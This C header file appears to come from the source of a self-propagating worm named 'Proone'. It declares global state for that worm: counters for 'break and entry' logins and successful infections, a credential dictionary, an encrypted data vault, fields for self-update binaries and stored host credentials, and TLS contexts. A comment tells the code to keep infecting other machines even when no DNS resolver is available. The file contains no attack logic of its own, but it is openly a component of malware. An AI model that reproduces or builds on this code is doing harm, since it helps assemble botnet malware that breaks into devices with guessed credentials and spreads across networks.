#pragma once
#include "pack.h"
#include "resolv.h"
#include "cred_dict.h"

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <sys/types.h>

#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>


#define PROONE_BNE_MAX_CNT	128

struct prne_global { // TODO: tidy init code when finalised
	struct timespec parent_start;
	struct timespec child_start;
	uint8_t boot_id[16];
	uint8_t instance_id[16];
	pth_t main_pth;
	/*
	* Could be NULL. Just keep infecting other machines without it.
	*/
	prne_resolv_t *resolv;
	pid_t parent_pid;
	pid_t child_pid;
	uint8_t *m_dvault;
	const uint8_t *m_exec;
	size_t exec_size;
	size_t self_size;
	const uint8_t *m_exec_dvault;
	int blackhole[2];
	int shm_fd;
	uint16_t dvault_size;
	bool is_child;

	prne_bin_archive_t bin_archive;
	prne_cred_dict_t cred_dict;

	struct {
		mbedtls_x509_crt ca;
		mbedtls_entropy_context entpy;
		mbedtls_ctr_drbg_context rnd;
	} ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
		mbedtls_dhm_context dhm;
	} s_ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
	} c_ssl;
};

struct prne_shared_global {
	// Format Revision
	uint8_t rev;
	// Number of child process crash.
	uint32_t crash_cnt;
	// "break and entry" count. Number of successful logins.
	uint64_t bne_cnt;
	// Number of successful infections.
	uint64_t infect_cnt;
	// null-terminated path to the new binary image
	char upbin_path[256];
	char upbin_args[1024];
	size_t host_cred_len;
	uint8_t host_cred_data[255];
};


extern struct prne_global prne_g;
// could be NULL on some environments
extern struct prne_shared_global *prne_s_g;
